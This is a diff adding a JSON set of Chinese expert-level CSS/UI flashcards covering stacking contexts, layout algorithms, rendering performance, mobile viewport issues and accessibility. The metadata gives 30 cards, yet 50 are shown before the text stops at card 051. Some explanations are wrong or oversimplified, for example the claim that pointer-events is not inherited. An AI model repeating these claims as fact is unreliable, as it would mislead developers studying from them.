@@ -1,0 +1,970 @@
+{
+  "file_metadata": {
+    "category_id": "css_ui",
+    "category_name": "CSS 与 UI",
+    "total_cards": 30,
+    "target_level": "Expert"
+  },
+  "cards": [
+    {
+      "id": "css_ui-flashcard-001",
+      "front_concept": "当一个元素设置了 transform: rotate(1deg) 但未显式设置 z-index 时，它为何会覆盖原本在它之后且设置了 z-index: 999 的普通兄弟元素（position: static）？",
+      "hints": ["层叠上下文", "z-index 生效条件", "transform 副作用"],
+      "back_explanation": "结论：transform 非 none 值会强制创建新的层叠上下文，且普通元素的 z-index 无效。\n核心机制：\n1. z-index 仅对定位元素（position 非 static）或 Flex/Grid 子项生效，position: static 元素的 z-index: 999 会被浏览器忽略。\n2. transform 会使元素创建新的层叠上下文，其层叠等级（Stacking Level）被提升，即使不写 z-index，其表现也优于普通的块级 (level 3) 或行内 (level 5) 元素。\n3. 层叠顺序：正 z-index > z-index: 0/auto(含 transform) > 行内元素 > 浮动元素 > 块级元素。\n防坑指南：z-index 无效时，请检查是否缺少 position 定义；同时避免 transform 意外提升层级导致遮挡。",
+      "difficulty": "advanced",
+      "tags": ["Stacking Context", "Transform", "Z-Index"]
+    },
+    {
+      "id": "css_ui-flashcard-002",
+      "front_concept": "Grid 布局中，子元素内容溢出容器导致布局撑破，即使设置了 flex: 1 或 grid-column: span 1，原因及标准修复方案？",
+      "hints": ["min-width 默认值", "minmax 函数", "溢出策略"],
+      "back_explanation": "结论：Grid/Flex 子项默认 min-width: auto，导致内容最小尺寸不小于内容宽度。\n核心机制：\n1. 浏览器计算轨道尺寸时考虑内容最小贡献值。\n2. 长文本或大图片阻止轨道收缩。\n最佳实践：显式设置 grid-item { min-width: 0; } 或使用 grid-template-columns: repeat(auto-fit, minmax(0, 1fr))。",
+      "difficulty": "advanced",
+      "tags": ["CSS Grid", "Overflow", "Min-Width"]
+    },
+    {
+      "id": "css_ui-flashcard-003",
+      "front_concept": "父元素 overflow: hidden 为何能阻止子元素 margin-top 穿透到父元素外部（Margin Collapsing）？",
+      "hints": ["BFC 触发", "块级格式化上下文", "边界折叠条件"],
+      "back_explanation": "结论：overflow 非 visible 值会触发 BFC，阻断垂直外边距折叠。\n核心机制：\n1.  margin 折叠需满足同 BFC 且无分隔物。\n2.  BFC 区域独立，内部子元素 margin 不与外部碰撞。\n防坑指南：优先使用 padding 或 border-top 替代 overflow 隐藏来做隔离，避免意外裁剪绝对定位子元素。",
+      "difficulty": "advanced",
+      "tags": ["BFC", "Margin Collapsing", "Overflow"]
+    },
+    {
+      "id": "css_ui-flashcard-004",
+      "front_concept": "在 Retina 屏下，使用 border: 1px 实际渲染物理像素是多少？如何用 transform 实现真正的 1 物理像素边框？",
+      "hints": ["devicePixelRatio", "scale 缩放", "伪元素"],
+      "back_explanation": "结论：DPR=2 时，1px CSS 像素=2 物理像素。\n核心机制：\n1. 利用伪元素绝对定位铺满。\n2. 设置宽高 200%。\n3. 使用 transform: scale(0.5) 压缩回原尺寸。\n最佳实践：使用 border-image 或 box-shadow 替代，或采用 CSS 变量动态计算 scale(1/dpr)。",
+      "difficulty": "advanced",
+      "tags": ["Mobile", "Retina", "1px Border"]
+    },
+    {
+      "id": "css_ui-flashcard-005",
+      "front_concept": "requestAnimationFrame 中读取 offsetTop 后立即写入 style.height，会触发几次重排（Reflow）？如何优化？",
+      "hints": ["强制同步布局", "读写分离", "FLIP 技术"],
+      "back_explanation": "结论：会触发强制同步布局，导致性能抖动。\n核心机制：\n1. 读操作迫使浏览器立即计算样式以返回最新值。\n2. 写操作标记脏数据，下次帧统一渲染。\n3. 读写交替打断批处理。\n最佳实践：集中所有读操作，再集中所有写操作；或使用 FLIP (First Last Invert Play) 动画模式。",
+      "difficulty": "advanced",
+      "tags": ["Performance", "Reflow", "RAF"]
+    },
+    {
+      "id": "css_ui-flashcard-006",
+      "front_concept": "CSS 变量（Custom Properties）与 Sass 变量在响应式场景下的本质区别是什么？何时必须用 CSS 变量？",
+      "hints": ["运行时解析", "DOM 树关联", "媒体查询"],
+      "back_explanation": "结论：CSS 变量是运行时动态解析，Sass 是编译时静态替换。\n核心机制：\n1. CSS 变量存在于 DOM 树，可被 JS 修改或媒体查询覆盖。\n2. Sass 变量编译后消失，无法响应运行时状态。\n最佳实践：涉及主题切换、动态计算、媒体查询联动时必须用 CSS 变量。",
+      "difficulty": "intermediate",
+      "tags": ["CSS Variables", "Sass", "Runtime"]
+    },
+    {
+      "id": "css_ui-flashcard-007",
+      "front_concept": "flex-shrink 的默认值是 1，为何有时子元素并不会按预期比例缩小？计算公式是什么？",
+      "hints": ["flex-basis 权重", "溢出空间分配", "min-width 限制"],
+      "back_explanation": "结论：缩小比例受 flex-basis 权重和 min-width 限制。\n核心机制：\n1. 收缩量 = (总基准大小 - 容器大小) * (子项基准 / 总基准)。\n2. 若计算后宽度 < min-width，则停止收缩。\n防坑指南：设置 flex-basis: 0 可让 shrink 仅基于内容权重，或显式设置 min-width: 0。",
+      "difficulty": "advanced",
+      "tags": ["Flexbox", "Flex-Shrink", "Layout Algorithm"]
+    },
+    {
+      "id": "css_ui-flashcard-008",
+      "front_concept": "will-change: transform 提升性能的原理是什么？滥用会导致什么严重后果？",
+      "hints": ["合成层", "内存占用", "GPU 加速"],
+      "back_explanation": "结论：提示浏览器提前创建合成层（Compositor Layer），交由 GPU 处理。\n核心机制：\n1. 元素独立分层，避免重绘影响其他层。\n2. 滥用会导致大量显存占用，引发页面崩溃或滚动卡顿。\n最佳实践：仅在动画开始前添加，动画结束后移除；或使用 CSS 动画自动触发层提升。",
+      "difficulty": "advanced",
+      "tags": ["Performance", "Will-Change", "Composite"]
+    },
+    {
+      "id": "css_ui-flashcard-009",
+      "front_concept": "iOS Safari 中 position: fixed 元素在键盘弹出时为何会错位或遮挡？标准解决方案？",
+      "hints": ["visual viewport", "layout viewport", "transform 替代"],
+      "back_explanation": "结论：键盘弹出改变 visual viewport，但 fixed 基于 layout viewport 定位。\n核心机制：\n1. 浏览器可视区域缩小，但 fixed 锚点不变。\n2. 输入框滚动行为不一致。\n最佳实践：避免在移动端长表单使用 fixed 底部栏；改用 absolute + transform 模拟，或监听 resize 调整。",
+      "difficulty": "advanced",
+      "tags": ["Mobile", "iOS", "Fixed Position"]
+    },
+    {
+      "id": "css_ui-flashcard-010",
+      "front_concept": "Grid 布局中 auto-fit 和 auto-fill 在子元素数量少于轨道容量时的表现差异？",
+      "hints": ["空轨道折叠", "重复函数", "剩余空间"],
+      "back_explanation": "结论：auto-fit 会折叠空轨道，auto-fill 保留空轨道占位。\n核心机制：\n1. 子元素不足时，auto-fit 将剩余轨道宽度合并分配给已有元素（类似 flex）。\n2. auto-fill 保持网格结构，剩余轨道宽度为 0 或最小值。\n最佳实践：做响应式卡片列表通常用 auto-fit 以充分利用空间。",
+      "difficulty": "advanced",
+      "tags": ["CSS Grid", "Auto-Fit", "Responsive"]
+    },
+    {
+      "id": "css_ui-flashcard-011",
+      "front_concept": "content-visibility: auto 与 loading=\"lazy\" 在性能优化上的核心区别是什么？",
+      "hints": ["渲染跳过", "网络请求", "布局计算"],
+      "back_explanation": "结论：content-visibility 跳过渲染树构建，loading 仅控制资源加载。\n核心机制：\n1. content-visibility: auto 在不可见时不计算子元素样式和布局。\n2. loading=\"lazy\" 仅推迟图片/iframe 网络请求，DOM 仍存在。\n最佳实践：长列表复杂 DOM 结构用 content-visibility，纯图片流用 loading=\"lazy\"。",
+      "difficulty": "advanced",
+      "tags": ["Performance", "Content-Visibility", "Rendering"]
+    },
+    {
+      "id": "css_ui-flashcard-012",
+      "front_concept": "为何 opacity: 0 的元素仍能触发鼠标事件，而 visibility: hidden 不能？display: none 呢？",
+      "hints": ["渲染树", "事件命中测试", "指针事件"],
+      "back_explanation": "结论：opacity 仅影响绘制，不影响布局和事件命中；visibility 隐藏但占位且不响应事件。\n核心机制：\n1. opacity 元素仍在渲染树和布局树中。\n2. visibility: hidden 元素在渲染树中标记为不可见，事件层忽略。\n3. display: none 直接从布局树移除。\n最佳实践：隐藏交互元素用 visibility 或 pointer-events: none。",
+      "difficulty": "intermediate",
+      "tags": ["Opacity", "Visibility", "Events"]
+    },
+    {
+      "id": "css_ui-flashcard-013",
+      "front_concept": "CSS Houdini Paint Worklet 与传统 CSS 背景图相比，最大的优势及生命周期限制？",
+      "hints": ["程序化绘制", "主线程隔离", "无 DOM 访问"],
+      "back_explanation": "结论：优势是动态生成图案且无需额外 HTTP 请求；限制是无法访问 DOM。\n核心机制：\n1. 运行在独立工作线程，不阻塞主线程。\n2. 通过 CSS 变量传递参数控制绘制。\n3. 无法读取页面元素状态。\n最佳实践：用于生成动态渐变、复杂背景纹理，避免频繁重绘。",
+      "difficulty": "advanced",
+      "tags": ["CSS Houdini", "Paint Worklet", "Graphics"]
+    },
+    {
+      "id": "css_ui-flashcard-014",
+      "front_concept": "移动端 100vh 在 Safari 中为何会被地址栏遮挡？现代 CSS 解决方案？",
+      "hints": ["动态视口", "dvh 单位", "JS 计算"],
+      "back_explanation": "结论：100vh 基于初始布局视口，不包含动态地址栏变化。\n核心机制：\n1. 浏览器地址栏伸缩改变可视区域。\n2. 旧方案需 JS 监听 resize 计算 --vh 变量。\n最佳实践：使用新单位 100dvh (dynamic viewport height)，兼容性不足时降级为 JS 方案。",
+      "difficulty": "advanced",
+      "tags": ["Mobile", "Viewport", "Units"]
+    },
+    {
+      "id": "css_ui-flashcard-015",
+      "front_concept": "display: flow-root 的主要作用是什么？它解决了什么历史遗留问题？",
+      "hints": ["清除浮动", "BFC 语义化", "clearfix 替代"],
+      "back_explanation": "结论：创建新的块级格式化上下文，且不影响元素本身 display 类型。\n核心机制：\n1. 专门用于清除浮动，无需 hack。\n2. 避免 overflow: hidden 带来的内容裁剪副作用。\n最佳实践：替代传统的 clearfix 伪元素方案，语义更清晰。",
+      "difficulty": "intermediate",
+      "tags": ["Display", "Flow-Root", "Clearfix"]
+    },
+    {
+      "id": "css_ui-flashcard-016",
+      "front_concept": "@property 规则注册 CSS 变量后，能实现传统变量无法做到的什么动画效果？",
+      "hints": ["类型检查", "插值动画", "渐变过渡"],
+      "back_explanation": "结论：允许 CSS 变量参与 transition 动画插值。\n核心机制：\n1. 普通变量变化是瞬间跳变。\n2. @property 定义 syntax 和 initial-value 后，浏览器可计算中间值。\n最佳实践：用于实现颜色渐变、角度旋转等变量动画，无需 JS 干预。",
+      "difficulty": "advanced",
+      "tags": ["CSS Houdini", "Properties", "Animation"]
+    },
+    {
+      "id": "css_ui-flashcard-017",
+      "front_concept": "为何在 Flex 容器中，img 标签默认会被拉伸变形？如何保持宽高比？",
+      "hints": ["替换元素", "align-items", "min-width"],
+      "back_explanation": "结论：Flex 默认 align-items: stretch，替换元素受此影响。\n核心机制：\n1.  flex 子项默认尝试填满交叉轴。\n2.  img 作为替换元素，若无显式高度，会被拉伸。\n最佳实践：设置 align-items: center 或 img { max-width: 100%; height: auto; }。",
+      "difficulty": "intermediate",
+      "tags": ["Flexbox", "Image", "AspectRatio"]
+    },
+    {
+      "id": "css_ui-flashcard-018",
+      "front_concept": "CSS 选择器 :has() 为何被称为“父选择器”？使用时的性能注意事项？",
+      "hints": ["关系选择器", "样式重算", "作用域"],
+      "back_explanation": "结论：可根据子元素状态匹配父元素。\n核心机制：\n1. 传统 CSS 只能向下选择，:has() 向上回溯。\n2. 子元素变化可能触发父元素样式重算，开销较大。\n最佳实践：避免在深层嵌套或高频变化元素上使用，注意浏览器兼容性。",
+      "difficulty": "advanced",
+      "tags": ["Selectors", "Has", "Performance"]
+    },
+    {
+      "id": "css_ui-flashcard-019",
+      "front_concept": "prefers-reduced-motion 媒体查询的主要用途？在动画实现中如何适配？",
+      "hints": ["无障碍访问", "系统偏好", "动画降级"],
+      "back_explanation": "结论：尊重用户系统设置的减少动画偏好，提升无障碍体验。\n核心机制：\n1. 检测用户是否开启减少动态效果。\n2. 关闭非必要的 transition 和 animation。\n最佳实践：所有装饰性动画均应包裹在此媒体查询中，提供静态 fallback。",
+      "difficulty": "intermediate",
+      "tags": ["Accessibility", "Media Query", "Animation"]
+    },
+    {
+      "id": "css_ui-flashcard-020",
+      "front_concept": "font-display: swap 会导致什么问题？如何优化 FOUT (Flash of Unstyled Text)？",
+      "hints": ["字体加载", "尺寸差异", "size-adjust"],
+      "back_explanation": "结论：系统字体替换为 Web 字体时，因度量差异导致布局跳动。\n核心机制：\n1. swap 立即显示 fallback 字体，加载完切换。\n2. 不同字体字宽行高不同，引起重排。\n最佳实践：使用 size-adjust 调整 fallback 字体度量，或使用 font-loading API 控制类名切换。",
+      "difficulty": "advanced",
+      "tags": ["Fonts", "Performance", "CLS"]
+    },
+    {
+      "id": "css_ui-flashcard-021",
+      "front_concept": "在深色模式适配中，color-scheme 属性与 prefers-color-scheme 媒体查询的区别？",
+      "hints": ["用户代理样式", "表单控件", "滚动条"],
+      "back_explanation": "结论：color-scheme 通知浏览器渲染原生控件的深色样式。\n核心机制：\n1. prefers-color-scheme 仅用于 CSS 条件判断。\n2. color-scheme 影响 scrollbar, input, button 等 UA 样式。\n最佳实践：同时使用，html { color-scheme: light dark; } 配合媒体查询自定义颜色。",
+      "difficulty": "advanced",
+      "tags": ["Dark Mode", "Color-Scheme", "UA Styles"]
+    },
+    {
+      "id": "css_ui-flashcard-022",
+      "front_concept": "为何使用 translateZ(0) 或 translate3d(0,0,0) 可以触发硬件加速？副作用？",
+      "hints": ["合成层提升", "字体模糊", "上下文创建"],
+      "back_explanation": "结论：强制元素进入 GPU 合成层。\n核心机制：\n1. 3D 变换需要独立层处理透视。\n2. 副作用包括字体渲染变粗（亚像素渲染失效）、内存增加。\n最佳实践：仅在动画元素上使用，避免在全站通用类中使用。",
+      "difficulty": "advanced",
+      "tags": ["GPU Acceleration", "Transform", "Rendering"]
+    },
+    {
+      "id": "css_ui-flashcard-023",
+      "front_concept": "env(safe-area-inset-bottom) 在什么场景下必须使用？如何提供 fallback？",
+      "hints": ["iPhone X 刘海", "padding 兼容", "常量支持"],
+      "back_explanation": "结论：适配全面屏底部 Home 指示条区域，防止内容被遮挡。\n核心机制：\n1. 仅在不支持 env 的浏览器中失效。\n2. 需配合 viewport-fit=cover meta 标签。\n最佳实践：padding-bottom: env(safe-area-inset-bottom, 20px); 提供固定像素降级。",
+      "difficulty": "advanced",
+      "tags": ["Mobile", "Safe-Area", "Env"]
+    },
+    {
+      "id": "css_ui-flashcard-024",
+      "front_concept": "CSS 中 :where() 与 :is() 的区别主要体现在哪里？何时优先用 :where()？",
+      "hints": ["特异性", "权重计算", "重置样式"],
+      "back_explanation": "结论：:where() 特异性恒为 0，:is() 取参数中最大特异性。\n核心机制：\n1. :where() 用于提供选择器便利而不增加权重。\n2. :is() 保持原有权重逻辑。\n最佳实践：编写 CSS Reset 或通用工具类时用 :where()，避免权重污染难以覆盖。",
+      "difficulty": "advanced",
+      "tags": ["Selectors", "Specificity", "Reset"]
+    },
+    {
+      "id": "css_ui-flashcard-025",
+      "front_concept": "aspect-ratio 属性出现之前，保持图片/视频宽高比的经典 Hack 是什么？原理？",
+      "hints": ["padding-top 百分比", "包含块", "绝对定位"],
+      "back_explanation": "结论：利用 padding-top 百分比基于父元素宽度的特性。\n核心机制：\n1. 垂直 padding 百分比参照父元素宽度。\n2. 子元素绝对定位填满容器。\n最佳实践：现代浏览器直接使用 aspect-ratio: 16/9; 旧设备降级为 padding 方案。",
+      "difficulty": "intermediate",
+      "tags": ["AspectRatio", "Hack", "Layout"]
+    },
+    {
+      "id": "css_ui-flashcard-026",
+      "front_concept": "animation-fill-mode: backwards 与 forwards 在动画延迟和结束阶段的表现差异？",
+      "hints": ["关键帧应用", "延迟期间", "结束状态"],
+      "back_explanation": "结论：backwards 在 delay 期间应用第一帧，forwards 保持最后一帧。\n核心机制：\n1. backwards 防止延迟期间元素突然消失或跳变。\n2. forwards 防止动画结束后元素复位。\n最佳实践：通常组合使用 both，确保动画全周期状态可控。",
+      "difficulty": "intermediate",
+      "tags": ["Animation", "Fill-Mode", "Keyframes"]
+    },
+    {
+      "id": "css_ui-flashcard-027",
+      "front_concept": "为何在 CSS 中修改 opacity 不会触发重排（Reflow），但修改 width 会？",
+      "hints": ["合成属性", "几何属性", "渲染流水线"],
+      "back_explanation": "结论：opacity 仅影响绘制阶段，width 影响布局阶段。\n核心机制：\n1. 几何属性变化需重新计算文档流（Reflow）。\n2. 合成属性变化仅更新图层像素（Composite）。\n最佳实践：动画优先选用 transform 和 opacity，避免动画 width/height/top/left。",
+      "difficulty": "intermediate",
+      "tags": ["Rendering", "Reflow", "Composite"]
+    },
+    {
+      "id": "css_ui-flashcard-028",
+      "front_concept": "container queries (@container) 相比 media queries 的核心优势是什么？适用场景？",
+      "hints": ["组件驱动", "上下文无关", "父容器尺寸"],
+      "back_explanation": "结论：基于父容器尺寸而非视口尺寸响应。\n核心机制：\n1. 组件可复用在不同布局区域，自适应容器宽度。\n2. 解耦组件样式与页面全局布局。\n最佳实践：设计系统组件库、卡片列表、侧边栏 widget 等独立模块。",
+      "difficulty": "advanced",
+      "tags": ["Container Queries", "Responsive", "Components"]
+    },
+    {
+      "id": "css_ui-flashcard-029",
+      "front_concept": "subgrid 解决了 Grid 布局中的什么痛点？浏览器支持情况如何？",
+      "hints": ["嵌套对齐", "父级轨道", "子项继承"],
+      "back_explanation": "结论：允许子 Grid 继承父级轨道定义，实现跨层级对齐。\n核心机制：\n1. 传统 Grid 嵌套需手动同步轨道尺寸。\n2. subgrid 使子项直接参与父级网格计算。\n最佳实践：用于表单布局、复杂卡片列表，需检查 Safari/Firefox 支持度。",
+      "difficulty": "advanced",
+      "tags": ["CSS Grid", "Subgrid", "Alignment"]
+    },
+    {
+      "id": "css_ui-flashcard-030",
+      "front_concept": "scrollbar-gutter 属性如何解决 content-visibility 或 overflow 导致的布局抖动？",
+      "hints": ["滚动条占位", "稳定空间", "overflow 行为"],
+      "back_explanation": "结论：强制保留滚动条空间，防止内容区域宽度变化。\n核心机制：\n1. 默认 overflow: auto 仅在需要时显示滚动条，挤压内容。\n2. scrollbar-gutter: stable 始终预留空间。\n最佳实践：替代 width: calc(100% + scrollbarWidth) 等 Hack，保持布局稳定。",
+      "difficulty": "advanced",
+      "tags": ["Scroll", "Layout Shift", "Overflow"]
+    },
+    {
+      "id": "css_ui-flashcard-031",
+      "front_concept": "position: sticky 元素在父元素设置了 overflow: hidden 时为何失效？其包含块（Containing Block）判定规则是什么？",
+      "hints": ["最近滚动祖先", "溢出裁剪", "包含块链"],
+      "back_explanation": "结论：sticky 依赖最近的滚动祖先作为包含块，overflow 非 visible 会阻断滚动链。\n核心机制：\n1. sticky 需要在滚动容器内计算偏移。\n2. 父元素 overflow 隐藏被视为非滚动容器或裁剪上下文。\n3. 导致 sticky 退化为 relative。\n防坑指南：确保 sticky 元素的所有祖先直到滚动容器 overflow 均为 visible。",
+      "difficulty": "advanced",
+      "tags": ["Position", "Sticky", "Overflow"]
+    },
+    {
+      "id": "css_ui-flashcard-032",
+      "front_concept": "outline 与 border 在盒模型计算和对布局影响上的本质区别？何时必须用 outline？",
+      "hints": ["不占空间", "绘制阶段", "焦点样式"],
+      "back_explanation": "结论：outline 不占据盒模型空间，不触发重排，绘制在元素上方。\n核心机制：\n1. border 计入元素宽高，outline 悬浮于外。\n2. outline 可以是非矩形（跟随轮廓）。\n最佳实践：焦点状态优先用 outline 避免布局抖动；需占位时用 border 或 box-shadow。",
+      "difficulty": "intermediate",
+      "tags": ["Box Model", "Outline", "Focus"]
+    },
+    {
+      "id": "css_ui-flashcard-033",
+      "front_concept": "vertical-align: middle 为何无法让 inline-block 元素在父容器中绝对垂直居中？基准线（Baseline）原理是什么？",
+      "hints": ["基线对齐", "幽灵空格", "行盒高度"],
+      "back_explanation": "结论：vertical-align 是相对于行盒基线，而非父容器中心。\n核心机制：\n1. 默认基线是字母 x 底部，inline-block 基线是其底部 margin 边。\n2. 父容器内有文字会导致基线偏移。\n最佳实践：使用 Flexbox (align-items: center) 或 Grid 实现垂直居中，避免 vertical-align 陷阱。",
+      "difficulty": "advanced",
+      "tags": ["Vertical Align", "Baseline", "Inline Block"]
+    },
+    {
+      "id": "css_ui-flashcard-034",
+      "front_concept": "组件库开发中，字体大小使用 rem 还是 em？嵌套组件时 em 会导致什么累积效应？",
+      "hints": ["继承计算", "根元素", "缩放比例"],
+      "back_explanation": "结论：全局布局用 rem，组件内部相对比例用 em。\n核心机制：\n1. em 基于父元素字体大小，嵌套会导致倍数放大/缩小。\n2. rem 基于 html 根元素，保持恒定。\n最佳实践：组件内部图标、间距可用 em 随文字缩放，但组件整体字号建议用 rem 避免嵌套失控。",
+      "difficulty": "advanced",
+      "tags": ["Units", "Rem", "Em"]
+    },
+    {
+      "id": "css_ui-flashcard-035",
+      "front_concept": "Flexbox 中使用 gap 属性在旧版浏览器中的兼容性问题及替代方案？",
+      "hints": ["Flex 支持度", "margin 模拟", "选择器"],
+      "back_explanation": "结论：早期 Flex 规范不支持 gap，仅 Grid 支持。\n核心机制：\n1. 现代浏览器已支持 Flex gap。\n2. 旧环境需使用 margin 配合 :not(:last-child) 或负 margin 容器。\n最佳实践：使用 PostCSS 插件自动降级为 margin 方案，或接受渐进增强。",
+      "difficulty": "intermediate",
+      "tags": ["Flexbox", "Gap", "Compatibility"]
+    },
+    {
+      "id": "css_ui-flashcard-036",
+      "front_concept": "@supports 规则在 CSS 渐进增强中的正确用法？能否检测浏览器版本？",
+      "hints": ["特性查询", "属性值支持", "逻辑组合"],
+      "back_explanation": "结论：检测浏览器是否支持特定 CSS 属性/值，而非版本号。\n核心机制：\n1. 基于能力检测（Feature Detection）。\n2. 支持 not, and, or 逻辑组合。\n最佳实践：用于开启新特性（如 grid）， fallback 写在 @supports 外部作为默认样式。",
+      "difficulty": "intermediate",
+      "tags": ["At Rules", "Supports", "Progressive Enhancement"]
+    },
+    {
+      "id": "css_ui-flashcard-037",
+      "front_concept": "backdrop-filter 与 filter 在性能消耗和渲染顺序上的主要区别？",
+      "hints": ["背后内容", "合成层", "高斯模糊"],
+      "back_explanation": "结论：backdrop-filter 处理元素背后内容，filter 处理元素自身内容。\n核心机制：\n1. backdrop-filter 需要采集背后像素，开销更大。\n2. 两者都会触发合成层提升。\n最佳实践：避免在大面积区域使用 backdrop-filter，尤其在滚动容器中，可能导致帧率下降。",
+      "difficulty": "advanced",
+      "tags": ["Filter", "Backdrop Filter", "Performance"]
+    },
+    {
+      "id": "css_ui-flashcard-038",
+      "front_concept": "父元素设置 pointer-events: none 后，如何让其子元素恢复响应鼠标点击？",
+      "hints": ["事件穿透", "属性继承", "子元素重置"],
+      "back_explanation": "结论：子元素显式设置 pointer-events: auto 可恢复交互。\n核心机制：\n1. pointer-events 非继承属性，但 none 会导致事件穿透到下层。\n2. 子元素可独立覆盖该设置。\n最佳实践：用于制作遮罩层中的可点击弹窗，遮罩本身 none，弹窗 auto。",
+      "difficulty": "intermediate",
+      "tags": ["Pointer Events", "Interaction", "Overlay"]
+    },
+    {
+      "id": "css_ui-flashcard-039",
+      "front_concept": "移动端点击延迟（300ms）问题，touch-action: manipulation 如何消除延迟？",
+      "hints": ["双击缩放", "手势识别", "浏览器优化"],
+      "back_explanation": "结论：告知浏览器禁用双击缩放，立即触发点击事件。\n核心机制：\n1. 浏览器等待判断是否为双击缩放。\n2. 设置 manipulation 后跳过等待。\n最佳实践：按钮元素默认添加，但需注意可能影响用户双击缩放需求。",
+      "difficulty": "advanced",
+      "tags": ["Mobile", "Touch Action", "Click Delay"]
+    },
+    {
+      "id": "css_ui-flashcard-040",
+      "front_concept": "img 标签使用 object-fit: cover 与 div 背景 background-size: cover 的语义及性能差异？",
+      "hints": ["SEO 友好", "替换元素", "懒加载"],
+      "back_explanation": "结论：img 语义更强，支持原生懒加载和 SEO。\n核心机制：\n1. object-fit 模拟背景行为但保留 img 标签特性。\n2. 背景图无法被搜索引擎索引。\n最佳实践：内容性图片用 img + object-fit，装饰性图片用 background。",
+      "difficulty": "intermediate",
+      "tags": ["Image", "Object Fit", "Semantic"]
+    },
+    {
+      "id": "css_ui-flashcard-041",
+      "front_concept": "clip-path 裁剪元素后，被裁剪区域是否还能响应鼠标事件？与 overflow: hidden 的区别？",
+      "hints": ["命中测试", "几何区域", "事件捕获"],
+      "back_explanation": "结论：clip-path 裁剪区域外不响应事件，overflow 裁剪区域外仍可能响应。\n核心机制：\n1. clip-path 改变元素几何命中区域。\n2. overflow 仅视觉裁剪，布局盒模型不变。\n最佳实践：需要完全隐藏交互区域用 clip-path，仅视觉隐藏用 overflow。",
+      "difficulty": "advanced",
+      "tags": ["Clip Path", "Events", "Overflow"]
+    },
+    {
+      "id": "css_ui-flashcard-042",
+      "front_concept": "为何动画中改变 top/left 性能差于 transform: translate？即使两者视觉效果相同。",
+      "hints": ["布局树", "合成器", "几何计算"],
+      "back_explanation": "结论：top/left 触发布局（Layout），transform 仅触发合成（Composite）。\n核心机制：\n1. 几何属性变化需重新计算文档流。\n2. transform 在 GPU 层操作矩阵，不触及布局树。\n最佳实践：60fps 动画必须使用 transform 和 opacity，避免拓扑属性。",
+      "difficulty": "advanced",
+      "tags": ["Animation", "Performance", "Transform"]
+    },
+    {
+      "id": "css_ui-flashcard-043",
+      "front_concept": "calc(100% / 3) 在 CSS 中是否合法？不同单位混合计算（如 calc(100% - 20px)）的注意事项？",
+      "hints": ["单位兼容性", "空格要求", "除法限制"],
+      "back_explanation": "结论：合法，但运算符两侧必须有空格。\n核心机制：\n1. 加减法需单位兼容或其中一方无单位。\n2. 乘除法数字必须无单位。\n最佳实践：始终在运算符两侧加空格，避免 Sass 编译干扰，直接写 calc 而非 #{}。",
+      "difficulty": "intermediate",
+      "tags": ["Calc", "Units", "Syntax"]
+    },
+    {
+      "id": "css_ui-flashcard-044",
+      "front_concept": "逻辑属性（Logical Properties）如 margin-inline-start 相比 margin-left 的核心优势？",
+      "hints": ["书写模式", "国际化", "RTL 适配"],
+      "back_explanation": "结论：自动适配书写方向（LTR/RTL），无需媒体查询。\n核心机制：\n1. 基于流方向而非物理方向。\n2. 切换 dir=\"rtl\" 时自动翻转左右。\n最佳实践：全球化项目优先使用逻辑属性，减少 RTL 样式覆盖代码。",
+      "difficulty": "advanced",
+      "tags": ["Logical Properties", "I18n", "RTL"]
+    },
+    {
+      "id": "css_ui-flashcard-045",
+      "front_concept": "html { scroll-behavior: smooth } 会对 JavaScript 的 scrollTo 方法产生什么影响？如何禁用？",
+      "hints": ["默认行为", "JS 覆盖", "behavior 选项"],
+      "back_explanation": "结论：JS 滚动默认继承 CSS 平滑行为，可能导致意外动画。\n核心机制：\n1. CSS 设置全局平滑滚动。\n2. JS scrollTo 可传入 behavior: 'auto' 覆盖。\n最佳实践：JS 控制滚动时显式设置 behavior: 'auto' 确保即时响应。",
+      "difficulty": "advanced",
+      "tags": ["Scroll", "Smooth", "JavaScript"]
+    },
+    {
+      "id": "css_ui-flashcard-046",
+      "front_concept": "scroll-snap-type 中 mandatory 与 proximity 在用户体验上的区别？",
+      "hints": ["强制吸附", "距离阈值", "滚动停止"],
+      "back_explanation": "结论：mandatory 强制吸附到最近点，proximity 仅在接近时吸附。\n核心机制：\n1. mandatory 可能改变用户滚动意图。\n2. proximity 更自然，允许停在中间。\n最佳实践：全屏轮播用 mandatory，长列表用 proximity。",
+      "difficulty": "intermediate",
+      "tags": ["Scroll Snap", "UX", "Scroll"]
+    },
+    {
+      "id": "css_ui-flashcard-047",
+      "front_concept": "color-mix() 函数相比 Sass 混合颜色的运行时优势？支持哪些颜色空间？",
+      "hints": ["动态混合", "OKLCH", "CSS 变量"],
+      "back_explanation": "结论：支持运行时动态混合，可结合 CSS 变量调整比例。\n核心机制：\n1. 在 srgb, oklch 等空间插值。\n2. 无需预编译，用户主题可实时调整。\n最佳实践：配合 @property 实现动态主题色混合，优于静态 Sass 变量。",
+      "difficulty": "advanced",
+      "tags": ["Color", "Color Mix", "Dynamic"]
+    },
+    {
+      "id": "css_ui-flashcard-048",
+      "front_concept": ":focus-visible 与 :focus 在键盘导航和鼠标点击下的表现差异？",
+      "hints": ["输入模态", "无障碍", "焦点环"],
+      "back_explanation": "结论：:focus-visible 仅在键盘导航时显示焦点样式。\n核心机制：\n1. :focus 鼠标点击也显示，影响美观。\n2. :focus-visible 智能判断输入方式。\n最佳实践：自定义焦点样式优先用 :focus-visible，保留默认 :focus 作为兜底。",
+      "difficulty": "advanced",
+      "tags": ["Accessibility", "Focus", "Selectors"]
+    },
+    {
+      "id": "css_ui-flashcard-049",
+      "front_concept": "实现 sr-only（屏幕阅读器专用）类的最佳 CSS 实践？为何不用 display: none？",
+      "hints": ["无障碍树", "视觉隐藏", "裁剪区域"],
+      "back_explanation": "结论：display: none 会移除无障碍树，sr-only 仅视觉隐藏。\n核心机制：\n1. 使用 clip: rect(0,0,0,0) 或绝对定位移出视口。\n2. 保留元素在 DOM 和无障碍树中。\n最佳实践：使用标准 sr-only 类，确保盲人用户可访问内容。",
+      "difficulty": "advanced",
+      "tags": ["Accessibility", "SR Only", "A11y"]
+    },
+    {
+      "id": "css_ui-flashcard-050",
+      "front_concept": "display: contents 会让元素在 DOM 中消失吗？对无障碍树（Accessibility Tree）有何影响？",
+      "hints": ["盒子消失", "子元素提升", "语义丢失"],
+      "back_explanation": "结论：元素盒子消失，子元素提升为直接子级，但元素本身语义可能丢失。\n核心机制：\n1. 不参与布局，类似 Fragment。\n2. 某些浏览器会移除该元素的无障碍节点。\n最佳实践：避免在有语义标签（如 ul, button）上使用，仅用于无语义 div 包裹。",
+      "difficulty": "advanced",
+      "tags": ["Display", "Contents", "Accessibility"]
+    },
+    {
+      "id": "css_ui-flashcard-051",
